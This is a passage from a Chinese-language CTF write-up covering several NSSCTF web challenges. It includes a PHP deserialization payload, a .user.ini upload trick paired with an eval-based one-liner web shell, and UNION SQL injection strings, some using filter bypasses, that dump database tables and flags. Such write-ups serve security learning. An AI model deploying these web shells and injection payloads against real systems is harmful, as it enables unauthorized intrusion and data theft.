href="https://">https://www.bilibili.com/video/BV1GN4y1c7ut/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/:2:&#123;/&quot;</span>,<span class="string">&quot;:3:&#123;&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="901aacec5c9e8f412935b1b1d82ee2df.png" alt="901aacec5c9e8f412935b1b1d82ee2df.png" /><img src="ddf40e1c15fcf00cddda177797c0b080.png" alt="ddf40e1c15fcf00cddda177797c0b080.png" /><h2 id="23-看看ip"><a href="#23-看看ip" class="headerlink" title="23.看看ip"></a>23.看看ip</h2><img src="e78ab70aec28838ebc8bb91f50c10425.png" alt="e78ab70aec28838ebc8bb91f50c10425.png" /><p>IP是线索</p><p>加一個X-Forwarded-For </p><p>是&#123;&#123;&#125;&#125; 模板注入</p><img src="07c07948454ee7ffc48f71d2eef2732d.png" alt="07c07948454ee7ffc48f71d2eef2732d.png" /><img src="73975aaedff0f314a228b66e81360da9.png" alt="73975aaedff0f314a228b66e81360da9.png" /><img src="02fe2b5fd3b0159f32acd93815881dfa.png" alt="02fe2b5fd3b0159f32acd93815881dfa.png" /><h2 id="24-怎么多了个没用的php文件"><a href="#24-怎么多了个没用的php文件" class="headerlink" title="24.怎么多了个没用的php文件"></a>24.怎么多了个没用的php文件</h2><img src="e715b46d3754d888ea7138fafc0bafe2.png" alt="e715b46d3754d888ea7138fafc0bafe2.png" /><img src="69a1a0687d44b0021a45a50f3ac70355.png" alt="69a1a0687d44b0021a45a50f3ac70355.png" /><p>可以看見在uploads文件夾下有, 個notion.php</p><img src="17919fb51068948349cf90f788b55f77.png" alt="17919fb51068948349cf90f788b55f77.png" /><p>蚁剑 fuzz</p><p>服务器是 nginx ，所以无法使用 htaccess(超文件)</p><img src="a8ae227886464f5d88225ca1e48e38b8.png" alt="a8ae227886464f5d88225ca1e48e38b8.png" /><h3 id="Apache-的-htaccess-机制"><a href="#Apache-的-htaccess-机制" class="headerlink" title="Apache 的 .htaccess 机制"></a>Apache 的 .htaccess 机制</h3><ul><li>分布式配置：Apache 被设计为允许在每个目录下放置一个 .htaccess 文件。</li><li>运行时读取：当收到一个请求时，Apache 会从网站根目录开始，一路向上查找并解析每一级目录下的 .htaccess 文件，然后实时应用其中的规则。</li><li>优点：方便共享主机用户在不接触主配置文件的情况下修改配置。</li><li>缺点：性能有开销，因为每个请求都可能要读取多个文件。</li></ul><h3 id="Nginx-的配置"><a href="#Nginx-的配置" class="headerlink" title="Nginx 的配置"></a>Nginx 的配置</h3><ul><li>集中式配置：Nginx 没有类似 .htaccess 的机制。它的所有配置都集中在一个主配置文件（通常是 nginx.conf）以及通过 include 指令引入的其他配置文件中。</li><li>启动时加载：Nginx 在启动或重载时，会一次性读取并编译所有配置，形成一个高效的配置树。</li><li>优点：性能极高，因为处理请求时不需要再去文件系统里查找和解析额外的配置文件。</li><li>缺点：用户必须能访问服务器配置文件，或者在 server 块内拥有写入权限（例如通过控制面板）</li></ul><p>寫一下: auto_prepend_file &#x3D; 1.png</p><p>改成.user.ini文件</p><p>用BP抓包 , 上傳ini文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line">auto_prepend_file=xxx 表示在文件頭包含</span><br><span class="line">auto_append_file=xxx 表示在文件尾包含</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件是一種日志包含 , 然後在訪問的時候ua加上一句話, 再上傳一個php文件來進行一個包含。</p><img src="b9623524e79975298235b69e9ddb8e97.png" alt="b9623524e79975298235b69e9ddb8e97.png" /><p>再上傳一句話木馬 1.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;123&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以知道notion.php包含了上面的代碼, 用notion.php連線:</p><img src="64a4dbb9c2cc139206a9233aaa925ead.png" alt="64a4dbb9c2cc139206a9233aaa925ead.png" /><img src="a770e99ebcab1e349cb7e231a2b5f1e3.png" alt="a770e99ebcab1e349cb7e231a2b5f1e3.png" /><img src="8cc9167e7d7a68e18fa21af218e726e7.png" alt="8cc9167e7d7a68e18fa21af218e726e7.png" /><br/><img src="55e24b74ad632bb9d989ef7a1bc54d4e.png" alt="55e24b74ad632bb9d989ef7a1bc54d4e.png" /><p>NSSCTF{213a5655-425e-4ac9-b0bd-32f9e6ea9af4}</p><h2 id="25-UploadBaby"><a href="#25-UploadBaby" class="headerlink" title="25.UploadBaby"></a>25.UploadBaby</h2><p>可恶的前端，不让我传word 马，把你扬了就老实了</p><img src="79d8ae6d5190ad9b97e4ac828c647c0b.png" alt="79d8ae6d5190ad9b97e4ac828c647c0b.png" /><img src="176c7a599d2243f544194ea825785c48.png" alt="176c7a599d2243f544194ea825785c48.png" /><p><a href="http://node6.anna.nssctf.cn:29933/uploads/1.php">http://node6.anna.nssctf.cn:29933/uploads/1.php</a></p><img src="038c210cb9ebb9c7215a35440029c686.png" alt="038c210cb9ebb9c7215a35440029c686.png" /><img src="b65a95273debd8677d7b34f1e4a9f167.png" alt="b65a95273debd8677d7b34f1e4a9f167.png" /><h2 id="26-ez-sql"><a href="#26-ez-sql" class="headerlink" title="26.ez_sql"></a>26.ez_sql</h2><img src="22c4a7ca350c2e376f7fa15a302be6ae.png" alt="22c4a7ca350c2e376f7fa15a302be6ae.png" /><p>相对安全的方式传参?????</p><img src="bf8307cd110d03d41a1c9d56e01f6146.png" alt="bf8307cd110d03d41a1c9d56e01f6146.png" /><img src="a2baabd2b65aa66654c5b9844891b59c.png" alt="a2baabd2b65aa66654c5b9844891b59c.png" /><img src="ea2230b1eec711aa501065f0294f173d.png" alt="ea2230b1eec711aa501065f0294f173d.png" /><p>判断列数先</p><p>双写命令绕过:<br><img src="f714aaf2dcedaab4bfdb6915775046b1.png" alt="f714aaf2dcedaab4bfdb6915775046b1.png" /></p><p>列数为3</p><p>判断显示位</p><img src="66831d116f87b5c4f1165d2d51722e4e.png" alt="66831d116f87b5c4f1165d2d51722e4e.png" /><p>尝试查看第二行</p><img src="de806c50d12a11da6d7fc221662342ca.png" alt="de806c50d12a11da6d7fc221662342ca.png" /><p>查询数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),(select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="e12f0d6df8aa9cf805081a86bde10b4b.png" alt="e12f0d6df8aa9cf805081a86bde10b4b.png" /><p>查询表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="28bc8935b945fdd395b45c46fb511689.png" alt="28bc8935b945fdd395b45c46fb511689.png" /><p>查询表内字段名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="fda0853ed31d9dc989a0db1275038c06.png" alt="fda0853ed31d9dc989a0db1275038c06.png" /><p>查询字段内容</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="5c1ff72d0d1a5408606592c551d1a663.png" alt="5c1ff72d0d1a5408606592c551d1a663.png" /><h2 id="27-这是什么？SQL-！注一下-！"><a href="#27-这是什么？SQL-！注一下-！" class="headerlink" title="27.这是什么？SQL ！注一下 ！"></a>27.这是什么？SQL ！注一下 ！</h2><img src="ea14253c98c1786d496d367c75cd16f4.png" alt="ea14253c98c1786d496d367c75cd16f4.png" /><p>可以看見sql代碼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class="string">&#x27;((((((&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;))))))&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>輸入一個1可以看到 </p><img src="99609d6114112c4c69c7f32084313877.png" alt="99609d6114112c4c69c7f32084313877.png" /><p>推断是两个字段 :</p><p>username &#x3D; tanji       password &#x3D; OHHHHHHH</p><p>select 一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="2b713b584e3eb2d5439ed2511444aa0e.png" alt="2b713b584e3eb2d5439ed2511444aa0e.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="1bbda58f59d944576882ba282830fa45.png" alt="1bbda58f59d944576882ba282830fa45.png" /><p>所有数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="a8b299b36cfae6217bddbd68cc1dc711.png" alt="a8b299b36cfae6217bddbd68cc1dc711.png" /><p>ctf的表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure><img src="3abceb620f2d24e7d68dc4cca18c16f6.png" alt="3abceb620f2d24e7d68dc4cca18c16f6.png" /><p>查users表中的字段名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="d6512debb874046d84a88bfcce76a388.png" alt="d6512debb874046d84a88bfcce76a388.png" /><p>查users表中数据：</p><p>0x7e &#x3D; ~ (波浪號)十六進制編碼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x7e</span>,password),<span class="number">2</span> <span class="keyword">from</span> users # </span><br></pre></td></tr></table></figure><img src="3b85731201687b978cf3059081b2057d.png" alt="3b85731201687b978cf3059081b2057d.png" /><p>再看其他数据库，还有一个ctftraining数据库:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="e7f4930394bb7c639d7fd61d9c7c7218.png" alt="e7f4930394bb7c639d7fd61d9c7c7218.png" /><p>先查flag表的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>#</span><br></pre></td></tr></table></figure><img src="88becf32643c762cdb4ad11246d44287.png" alt="88becf32643c762cdb4ad11246d44287.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> flag,<span class="number">2</span> <span class="keyword">from</span> ctftraining.flag #</span><br></pre></td></tr></table></figure><img src="28257c2a109f722a3b1374fb21ed961a.png" alt="28257c2a109f722a3b1374fb21ed961a.png" /><h2 id="28-理想国"><a href="#28-理想国" class="headerlink" title="28.理想国"></a>28.理想国</h2><p>給了一個json檔:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;swagger&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;Interface API Documentation&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">      &quot;title&quot;: &quot;Interface API&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;paths&quot;: &#123;</span><br><span class="line">      &quot;/api-base/v0/register&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Registration API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user registration&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Your wisdom is not sufficient to be called a sage&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/login&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Login API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user login&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/search&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Information Query API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used to query information&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;name&quot;: &quot;file&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;query&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;404&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;File not found&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/logout&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Logout API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user logout&quot;,</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;definitions&quot;: &#123;</span><br><span class="line">      &quot;UserRegistration&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;UserLogin&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;securityDefinitions&quot;: &#123;</span><br><span class="line">      &quot;TokenAuth&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;apiKey&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Authorization&quot;,</span><br><span class="line">        &quot;in&quot;: &quot;header&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;security&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;TokenAuth&quot;: []</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>不會看, 拋給D老師分析了一下:</p><h3 id="主要組成部分"><a href="#主要組成部分" class="headerlink" title="主要組成部分"></a>主要組成部分</h3><h3 id="基礎資訊"><a href="#基礎資訊" class="headerlink" title="基礎資訊"></a>基礎資訊</h3><p>API 版本：Swagger 2.0</p><p>標題：Interface API</p><p>版本：1.1</p><p>描述：介面 API 文檔</p><ol start="2"><li>API 端點分析<br>🔐 認證相關端點<br>POST &#x2F;api-base&#x2F;v0&#x2F;register - 用戶註冊</li></ol><p>需要 username 和 password</p><p>響應：200成功, 400參數錯誤, 401權限不足</p><p>POST &#x2F;api-base&#x2F;v0&#x2F;login - 用戶登入</p><p>需要 username 和 password</p><p>響應：200成功, 400參數錯誤</p><p>🔍 資料查詢端點<br>GET &#x2F;api-base&#x2F;v0&#x2F;search - 資訊查詢</p><p>需要 file 查詢參數</p><p>需要 Token 認證</p><p>響應：200成功, 400參數錯誤, 401未授權, 404檔案不存在</p><p>🚪 登出端點<br>GET &#x2F;api-base&#x2F;v0&#x2F;logout - 用戶登出</p><p>需要 Token 認證</p><p>響應：200成功, 401未授權</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 